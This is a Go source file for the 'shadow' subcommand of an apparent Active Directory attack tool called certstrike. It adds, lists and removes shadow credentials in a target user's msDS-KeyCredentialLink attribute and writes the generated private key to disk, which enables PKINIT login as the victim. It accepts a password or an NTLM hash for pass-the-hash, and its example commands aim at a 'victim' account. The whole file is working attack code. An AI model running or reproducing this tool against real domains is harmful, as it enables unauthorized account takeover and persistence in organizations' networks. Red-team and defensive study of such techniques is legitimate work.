package main

import (
	"fmt"
	"os"

	"github.com/loudmumble/certstrike/pkg/pki"
	"github.com/spf13/cobra"
)

var shadowCmd = &cobra.Command{
	Use:   "shadow",
	Short: "Shadow Credentials — msDS-KeyCredentialLink attacks",
	Long: `Manage shadow credentials on AD user objects via msDS-KeyCredentialLink.
Allows PKINIT authentication without requiring a CA.

Examples:
  certstrike shadow --add --target "CN=victim,CN=Users,DC=corp,DC=local" --target-dc dc01 --domain corp.local -u admin -p pass
  certstrike shadow --list --target "CN=victim,CN=Users,DC=corp,DC=local" --target-dc dc01 --domain corp.local -u admin -p pass
  certstrike shadow --remove --target "CN=victim,CN=Users,DC=corp,DC=local" --device-id <guid> --target-dc dc01 --domain corp.local -u admin -p pass`,
	RunE: func(cmd *cobra.Command, args []string) error {
		doAdd, _ := cmd.Flags().GetBool("add")
		doList, _ := cmd.Flags().GetBool("list")
		doRemove, _ := cmd.Flags().GetBool("remove")

		if !doAdd && !doList && !doRemove {
			return cmd.Help()
		}

		targetDC, _ := cmd.Flags().GetString("target-dc")
		domain, _ := cmd.Flags().GetString("domain")
		username, _ := cmd.Flags().GetString("username")
		password, _ := cmd.Flags().GetString("password")
		hash, _ := cmd.Flags().GetString("hash")
		target, _ := cmd.Flags().GetString("target")

		if targetDC == "" || domain == "" {
			return fmt.Errorf("--target-dc and --domain are required")
		}
		if target == "" {
			return fmt.Errorf("--target (DN of target user) is required")
		}

		cfg := &pki.ADCSConfig{
			TargetDC: targetDC, Domain: domain,
			Username: username, Password: password, Hash: hash,
		}

		if doAdd {
			entry, err := pki.AddShadowCredential(cfg, target)
			if err != nil {
				return err
			}
			// Write private key to file
			keyPath := fmt.Sprintf("shadow_%s.key", entry.DeviceID[:8])
			keyFile, err := os.Create(keyPath)
			if err != nil {
				return fmt.Errorf("write key file: %w", err)
			}
			defer keyFile.Close()
			pki.WriteECPrivateKey(keyFile, entry.PrivateKey)
			fmt.Printf("[+] Private key written to: %s\n", keyPath)
			return nil
		}

		if doList {
			return pki.ListShadowCredentials(cfg, target)
		}

		if doRemove {
			deviceID, _ := cmd.Flags().GetString("device-id")
			if deviceID == "" {
				return fmt.Errorf("--device-id is required for removal")
			}
			return pki.RemoveShadowCredential(cfg, target, deviceID)
		}

		return nil
	},
}

func init() {
	rootCmd.AddCommand(shadowCmd)

	shadowCmd.Flags().Bool("add", false, "Add a shadow credential to the target")
	shadowCmd.Flags().Bool("list", false, "List shadow credentials on the target")
	shadowCmd.Flags().Bool("remove", false, "Remove a shadow credential from the target")
	shadowCmd.Flags().String("target", "", "Target user DN (e.g. CN=victim,CN=Users,DC=corp,DC=local)")
	shadowCmd.Flags().String("device-id", "", "DeviceID of credential to remove")
	shadowCmd.Flags().String("target-dc", "", "Target domain controller")
	shadowCmd.Flags().String("domain", "", "Active Directory domain")
	shadowCmd.Flags().StringP("username", "u", "", "Domain username")
	shadowCmd.Flags().StringP("password", "p", "", "Domain password")
	shadowCmd.Flags().String("hash", "", "NTLM hash for pass-the-hash")
}
